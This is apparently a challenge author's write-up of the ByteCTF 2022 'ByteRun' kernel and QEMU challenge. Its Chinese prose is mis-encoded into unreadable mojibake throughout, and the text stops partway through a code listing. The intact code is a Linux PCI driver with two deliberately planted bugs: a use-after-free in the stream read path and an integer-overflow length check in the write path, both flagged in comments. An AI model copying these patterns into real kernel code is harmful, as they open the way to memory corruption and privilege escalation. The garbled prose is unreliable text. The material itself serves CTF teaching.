ä¸Šè¿™ä¸€æ¬¡çš„å‡ºé¢˜æ—¶é—´æ¯”è¾ƒçŸ­ï¼Œäºæ˜¯åªå¼„å¥½äº†â€œåç«¯åˆ©ç”¨â€çš„éƒ¨åˆ†â€”â€”ã€ŒLinux kernelææƒã€ + ã€ŒQEMUé€ƒé€¸ã€</p><blockquote><p>â€œåç«¯åˆ©ç”¨â€æ˜¯ç¬”è€…ä¸´æ—¶ç”Ÿé€ çš„è¯ï¼Œä»…åœ¨è¿™ç¯‡æ–‡ç« çš„å¼€å¤´è¡¨ç¤ºã€Œæ‹¿åˆ°äº†è¿œç«¯ä»£ç æ‰§è¡Œæƒé™ä¹‹åçš„åˆ©ç”¨éƒ¨åˆ†ã€ï¼ˆç¬‘ï¼‰</p></blockquote><ul><li>kernel éƒ¨åˆ†çš„çµæ„Ÿæ¥è‡ªäº CVE-2022-0847ï¼Œä¹Ÿå°±æ˜¯â€œdirty pipeâ€ï¼Œç¬”è€…æ¨¡ä»¿å†…æ ¸çš„ pipe ç»“æ„è‡ªå·±å†™äº†ä¸€ä¸ªç®€åŒ–ç‰ˆçš„ pipeï¼Œå¹¶ç•™ä¸‹äº†ä¸€ä¸ª UAF æ¼æ´</li><li>QEMU éƒ¨åˆ†åˆ™ä¸»è¦æ˜¯ä¸€ä¸ªæä¾›å­˜å‚¨åŠŸèƒ½çš„â€œå—è®¾å¤‡â€ï¼Œæ¼æ´åˆ™æ˜¯éå¸¸æ˜æ˜¾çš„æ•´æ•°æº¢å‡ºå¯¼è‡´çš„è¶Šç•Œè¯»å†™</li></ul><p>åœ¨ç¬”è€…çœ‹æ¥æ•´ä½“éš¾åº¦å…¶å®å¹¶ä¸ç®—å¤ªå¤§ï¼ˆå› ä¸ºå½“ç¬”è€…å¼€å§‹å‡ºè¿™é“é¢˜ç›®çš„æ—¶å€™å‡ºé¢˜æ—¶é—´å·²ç»æ‰€å‰©æ— å‡ äº†ï¼Œé‚£æ—¶å€™å…¶å®æ²¡æƒ³å‡ºå•¥å¥½çš„ç‚¹å­XDï¼‰ï¼Œæ‰€ä»¥åœ¨å…¶ä»–å‡ºé¢˜äººéƒ½åœ¨æ–‡æ¡£é‡Œå†™â€œéš¾åº¦ä¸­ç­‰â€çš„æ—¶å€™åªæœ‰ç¬”è€…ä¸€ä¸ªäººå†™äº†â€œéš¾åº¦ç®€å•â€ï¼Œä»æœ€ç»ˆçš„è§£é¢˜æƒ…å†µæ¥çœ‹çš„è¯ <em>è¿™ä¸€æ¬¡æ•´ä¸ª pwn çš„å‡ºé¢˜å¥½åƒéƒ½ä¸å’‹èƒ½å¸å¼•å¤§ä½¬æ¥åšâ€¦</em></p><p>æœ¬æ¬¡é¢˜ç›®æºç å·²ç»å…¨éƒ¨å¼€æºï¼š<a href="https://github.com/arttnba3/ByteCTF2022_PWN-ByteRun">https://github.com/arttnba3/ByteCTF2022_PWN-ByteRun</a></p><h1>0x01.é¢˜ç›®åˆ†æ</h1><p>u1s1ï¼Œè¿™ä¸€æ¬¡ç¼–è¯‘å‡ºæ¥çš„ä»£ç å†åæ±‡ç¼–ä¹‹åç¡®å®æ¯”è¾ƒéš¾çœ‹ï¼Œå“ªæ€•æ˜¯ç¬”è€…ä½œä¸ºå‡ºé¢˜äººå°è¯•é€†äº†ä¸€ä¸‹ä¹Ÿæ²¡èƒ½åœ¨çŸ­æ—¶é—´å†…çœ‹æ˜ç™½æ•´ä¸ªé¢˜ç›®çš„è¿è¡Œé€»è¾‘ï¼ˆç¬‘ï¼‰</p><h2 id="ä¸€ã€å†…æ ¸æ¨¡å—éƒ¨åˆ†">ä¸€ã€å†…æ ¸æ¨¡å—éƒ¨åˆ†</h2><p>ç¬”è€…ä¸€å¼€å§‹å°±æƒ³å†™ä¸€ä¸ªåŠŸèƒ½ä¸Šæ¯”è¾ƒå®Œæ•´çš„è®¾å¤‡é©±åŠ¨ï¼Œäºæ˜¯åŒ…æ‹¬ä¸è®¾å¤‡äº¤äº’é‚£ä¸€å—çš„ä»£ç ä¹Ÿé›†æˆåœ¨äº†å†…æ ¸æ¨¡å—ä¸­ï¼Œä¸è¿‡åœ¨è¿™é‡Œç¬”è€…è®¾å®šäº†é©±åŠ¨å­˜åœ¨ç€ä¸¤ç§è¿è¡Œæ¨¡å¼ï¼šæµï¼ˆstreamï¼‰æ¨¡å¼å’Œå—ï¼ˆblockï¼‰æ¨¡å¼ï¼Œå…¶ä¸­å‰è€…æ˜¯ä¸è®¾å¤‡æ— å…³çš„ç®¡é“åŠŸèƒ½éƒ¨åˆ†ï¼Œåè€…åˆ™æ˜¯ä¸è®¾å¤‡äº¤äº’çš„éƒ¨åˆ†ï¼Œä½†æ˜¯åè€…çš„åŠŸèƒ½éœ€è¦ root æƒé™æ‰èƒ½å¼€å¯ï¼Œäºæ˜¯ç¬¬ä¸€ä¸ªä»»åŠ¡å°±æ˜¯å†…æ ¸ææƒï¼›ï¼‰</p><p>åœ¨æ¨¡å—åˆå§‹åŒ–å‡½æ•°å½“ä¸­ä¸º PCI è®¾å¤‡è¿›è¡Œäº†ç›¸åº”çš„æ¥å£æ³¨å†Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">bytedev_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-comment">/* register pci driver */</span><br>    <span class="hljs-keyword">return</span> pci_register_driver(&amp;bytedev_driver);<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ä¸€ä¸ªæ–°çš„ bytedev è®¾å¤‡æ’è¿›æ¥çš„æ—¶å€™ï¼Œå†…æ ¸ä¾¿ä¼šéå†æ¥å£æ¯”å¯¹ BTFï¼Œæœ€åè°ƒç”¨åˆ°æˆ‘ä»¬çš„åˆå§‹åŒ–å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_device_id</span> <span class="hljs-title">bytedev_ids</span>[] =</span> &#123;<br>    &#123; PCI_DEVICE(PCI_VENDOR_ID_BYTEDEV, PCI_DEVICE_ID_BYTEDEV) &#125;,<br>    &#123; <span class="hljs-number">0</span>, &#125;,<br>&#125;;<br><br>MODULE_DEVICE_TABLE(pci, bytedev_ids);<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_driver</span> <span class="hljs-title">bytedev_driver</span> =</span> &#123;<br>    .name       = <span class="hljs-string">&quot;bytedev&quot;</span>,<br>    .id_table   = bytedev_ids,<br>    .probe      = bytedev_pci_probe,<br>    .remove     = bytedev_pci_remove,<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯¹äºæ¯ä¸ªæ’ä¸Šæ¥çš„ bytedev ç±»å‹çš„è®¾å¤‡ï¼Œé©±åŠ¨éƒ½ä¼šåŠ¨æ€ç”Ÿæˆä¸€ä¸ªå¯¹åº”çš„ç»“æ„ <code>bytedev</code>ï¼Œå¹¶ä½¿ç”¨ <code>pci_request_regions()</code> ç­‰å‡½æ•°è¿›è¡Œèµ„æºçš„æ¢æµ‹ä¸å ç”¨ï¼Œä»è€Œä½¿å¾—<strong>æ— æ³•ç›´æ¥é€šè¿‡åœ¨ç”¨æˆ·æ€è¿›ç¨‹æ‰“å¼€è®¾å¤‡èµ„æºæ–‡ä»¶çš„æ–¹å¼ä¸è®¾å¤‡è¿›è¡Œäº¤äº’</strong>ï¼š</p><blockquote><p>å…¶å®å¯ä»¥é€šè¿‡ææƒåå¸è½½å†…æ ¸æ¨¡å—çš„æ–¹å¼æ¥é‡æ–°å®ç°ç›´æ¥é€šè¿‡è®¾å¤‡èµ„æºæ–‡ä»¶ä¸è®¾å¤‡è¿›è¡Œäº¤äº’ï¼Œä½†å®é™…ä¸Šåœ¨å†…æ ¸æ¨¡å—å½“ä¸­ç¬”è€…æ—©å·²å°è£…å¥½äº†æ‰€éœ€è¦ä½¿ç”¨çš„æ¥å£ï¼ˆç¬‘ï¼‰</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bytedev_pci_probe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pci_dev *pdev,</span><br><span class="hljs-params">                            <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pci_device_id *id)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">bdev</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span>   *<span class="hljs-title">dev_node</span>;</span><br>    <span class="hljs-type">char</span> dname[BYTEDEV_DEVNAME_LENGTH];<br>    <span class="hljs-type">int</span> minor_num;<br>    <span class="hljs-type">int</span> err;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[bytedev:] ByteDance pci device detected!&quot;</span>);<br><br>    <span class="hljs-comment">/* alloc space for bytedev struct*/</span><br>    <span class="hljs-keyword">if</span> (!(bdev = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev), GFP_KERNEL))) &#123;<br>        err = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> err_no_mem;<br>    &#125;<br><br>    pci_set_drvdata(pdev, bdev);<br><br>    <span class="hljs-comment">/* enable the device */</span><br>    <span class="hljs-keyword">if</span> ((err = pci_enable_device(pdev))) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] Cannot enable PCI device, abort.&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_free_dev;<br>&#125;<br><br>    <span class="hljs-comment">/* check for MMIO flags on BAR 0 */</span><br>    <span class="hljs-keyword">if</span> (!(pci_resource_flags(pdev, <span class="hljs-number">0</span>) &amp; IORESOURCE_MEM)) &#123;<br>        printk(KERN_ERR <br>            <span class="hljs-string">&quot;[bytedev:] Cannot find PCI device base address for MMIO, abort.&quot;</span>);<br>        err = -ENODEV;<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* check for PMIO flags on BAR 1 */</span><br>    <span class="hljs-keyword">if</span> (!(pci_resource_flags(pdev, <span class="hljs-number">1</span>) &amp; IORESOURCE_IO)) &#123;<br>        printk(KERN_ERR <br>            <span class="hljs-string">&quot;[bytedev:] Cannot find PCI device base address for PMIO, abort.&quot;</span>);<br>        err = -ENODEV;<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* request for PCI bar spaces */</span><br>    <span class="hljs-keyword">if</span> ((err = pci_request_regions(pdev, DRV_NAME))) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;Cannot obtain PCI resources, abort.&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* iomap for mmio space */</span><br>    bdev-&gt;mmio_addr = pci_ioremap_bar(pdev, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!bdev-&gt;mmio_addr) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;Cannot ioremap for MMIO space, abort.&quot;</span>);<br>        err = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> err_out_free_region;<br>    &#125;<br><br>    <span class="hljs-comment">/* get I/O ports base */</span><br>    bdev-&gt;io_base = pci_resource_start(pdev, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* register device node */</span><br>    minor_num = bytedev_get_unused_minor_num();<br><br>    <span class="hljs-keyword">if</span> (minor_num &lt; <span class="hljs-number">0</span>) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] bytedev amount limits!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_iounmap_mmio;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (minor_num == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">snprintf</span>(dname, <span class="hljs-keyword">sizeof</span>(dname), <span class="hljs-string">&quot;%s&quot;</span>, DEVICE_NAME);<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">snprintf</span>(dname, <span class="hljs-keyword">sizeof</span>(dname), <span class="hljs-string">&quot;%s%d&quot;</span>, DEVICE_NAME, minor_num);<br>    &#125;<br><br>    dev_node = device_create(bytedev_class, <span class="hljs-literal">NULL</span>, <br>                            MKDEV(bytedev_major_num, minor_num), <br>                            <span class="hljs-literal">NULL</span>, dname);<br>    <span class="hljs-keyword">if</span> (IS_ERR(dev_node)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] Failed to create the device!&quot;</span>);<br>        err = PTR_ERR(dev_node);<br>        <span class="hljs-keyword">goto</span> err_out_unuse_minor;<br>    &#125;<br><br>    <span class="hljs-comment">/* other data init */</span><br>    spin_lock_init(&amp;bdev-&gt;dev_lock);<br>    <span class="hljs-built_in">memset</span>(bdev-&gt;data_queue, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*) * BYTEDEV_MAX_BUFS);<br>    bdev-&gt;head_idx = <span class="hljs-number">0</span>;<br>    bdev-&gt;tail_idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* info records */</span><br>    bdev-&gt;pdev = pdev;<br>    bdev-&gt;dev_node = dev_node;<br>    bdev-&gt;minor_num = minor_num;<br>    bytedev_arr[minor_num] = bdev;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[bytedev:] bytedev%d register complete.&quot;</span>, minor_num);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_out_unuse_minor:<br>    bytedev_set_unused_minor_num(minor_num);<br>err_out_iounmap_mmio:<br>    pci_iounmap(pdev, bdev-&gt;mmio_addr);<br>err_out_free_region:<br>    pci_release_regions(pdev);<br>err_out_disable_pdev:<br>    pci_disable_device(pdev);<br>err_out_free_dev:<br>    kfree(bdev);<br>err_no_mem:<br>    <span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>bytedev</code> ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span>   *<span class="hljs-title">dev_node</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_dev</span>  *<span class="hljs-title">pdev</span>;</span><br>    <span class="hljs-type">int</span> minor_num;<br>    u64 __iomem  *mmio_addr;<br>    u64 io_base;<br><br>    <span class="hljs-type">spinlock_t</span> dev_lock;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">data_queue</span>[<span class="hljs-title">BYTEDEV_MAX_BUFS</span>];</span><br>    <span class="hljs-type">int</span> head_idx, tail_idx;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯¹äºæµæ¨¡å¼è€Œè¨€ï¼Œå…¶ä½¿ç”¨ä¸€ä¸ªç¯å½¢é˜Ÿåˆ— <code>data_queue</code> æ¥å®ç°è¿›ç¨‹é—´çš„æ•°æ®ä¼ é€’ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡è¯»å†™è®¾å¤‡æ–‡ä»¶æ¥å®ç°å¯¹ç¯å½¢é˜Ÿåˆ—çš„æ•°æ®è¯»å†™ï¼Œå…¶æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå¦‚ä¸‹ç»“æ„çš„æŒ‡é’ˆæ•°ç»„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> len, offset;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªæ¼æ´ä¾¿å­˜åœ¨äºè¯»çš„è¿‡ç¨‹å½“ä¸­ï¼Œåœ¨è¯»çš„è¿‡ç¨‹ä¸­å­˜åœ¨ä¸€ä¸ª UAF æ¼æ´ï¼Œä»è€Œå¯¼è‡´è¯»å–å®Œæ•°æ®åå¯¹åº”çš„ buffer å¹¶æ²¡æœ‰è¢«é‡Šæ”¾ï¼Œä½†æ˜¯åœ¨æ­£å¸¸åœ°å¯¹è¯¥åŠŸèƒ½çš„ä½¿ç”¨ä¸Šå¹¶ä¸ä¼šé€ æˆå½±å“ï¼Œå› ä¸º slub allocator å¹¶ä¸ä¼¼ ptmalloc é‚£æ ·æ’å®šä½¿ç”¨å‰ 8 å­—èŠ‚æ¥å­˜æ”¾ next free objectï¼Œè¿™ä½¿å¾—å…¶ç»Ÿè®¡æ•°æ®å­—æ®µå¾—ä»¥ä¿ç•™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">bytedev_stream_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *f, </span><br><span class="hljs-params">                            <span class="hljs-type">char</span> __user *buf, </span><br><span class="hljs-params">                            <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">loff_t</span> *loff)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">dev</span> =</span> f-&gt;private_data;<br>    <span class="hljs-type">ssize_t</span> ret;<br>    <span class="hljs-type">ssize_t</span> rlen = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (bytedev_queue_empty(dev)) &#123;<br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span>;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left, clen;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * If the data queue is already empty,</span><br><span class="hljs-comment">         * just quit out is OK.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_empty(dev)) &#123;<br>            ret = rlen;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        d = dev-&gt;data_queue[dev-&gt;head_idx];<br>        left = d-&gt;len - d-&gt;offset;<br>        clen = left &gt; size ? size : left;<br><br>        ret = copy_to_user(buf + rlen, &amp;d-&gt;data[d-&gt;offset], clen);<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while reading the buffer!&quot;</span>);<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        size -= clen;<br>        d-&gt;offset += clen;<br>        rlen += clen;<br><br>        <span class="hljs-keyword">if</span> (d-&gt;offset == d-&gt;len) &#123;<br>            <span class="hljs-keyword">if</span> (d-&gt;len == BYTEDEV_BUF_SIZE) &#123;<br>                kfree(d);<br>                <span class="hljs-comment">/* ther&#x27;s where we made our basic bug: a UAF */</span><br>                <span class="hljs-comment">//dev-&gt;data_queue[dev-&gt;head_idx] = NULL;</span><br>                dev-&gt;head_idx++;<br>                dev-&gt;head_idx %= BYTEDEV_MAX_BUFS;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ret = rlen;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    ret = rlen;<br><br>out:<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªæ¼æ´åˆ™å­˜åœ¨äºå†™çš„è¿‡ç¨‹å½“ä¸­ï¼Œåœ¨å¯¹ç»Ÿè®¡æ•°æ®å­—æ®µçš„åˆ¤å®šå½“ä¸­å­˜åœ¨ä¸€ä¸ªæ•´å‹æº¢å‡ºæ¼æ´ï¼Œè‹¥æ˜¯æ­£å¸¸ä½¿ç”¨åˆ™ä»ä¸ä¼šè§¦å‘è¿™ä¸ªæ¼æ´ï¼Œä½†è‹¥æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF ä¿®æ”¹å…¶ä¸ºä¸€ä¸ªè¾ƒå¤§çš„å€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®©å†…æ ¸æ¨¡å—è®¤ä¸ºè¯¥ buffer ä¾ç„¶æœ‰å¯ä»¥å†™å…¥çš„ç©ºé—´ï¼Œä»è€Œå®Œæˆè¶Šç•Œå†™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bytedev_queue_last_empty</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bytedev *dev)</span><br>&#123;<br>    <span class="hljs-type">int</span> idx = (dev-&gt;tail_idx - <span class="hljs-number">1</span> + BYTEDEV_MAX_BUFS) % BYTEDEV_MAX_BUFS;<br><br>    <span class="hljs-keyword">if</span> (!dev-&gt;data_queue[idx]) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* there&#x27;s where we made our expand bug: integer overflow */</span><br>    <span class="hljs-keyword">return</span> (BYTEDEV_BUF_SIZE - dev-&gt;data_queue[idx]-&gt;len) &gt; <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* the correct version */</span><br>    <span class="hljs-comment">//return dev-&gt;data_queue[idx]-&gt;len &lt; BYTEDEV_BUF_SIZE;</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">bytedev_stream_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *f, </span><br><span class="hljs-params">                            <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, </span><br><span class="hljs-params">                            <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">loff_t</span> *loff)</span><br>&#123;<br>    <span 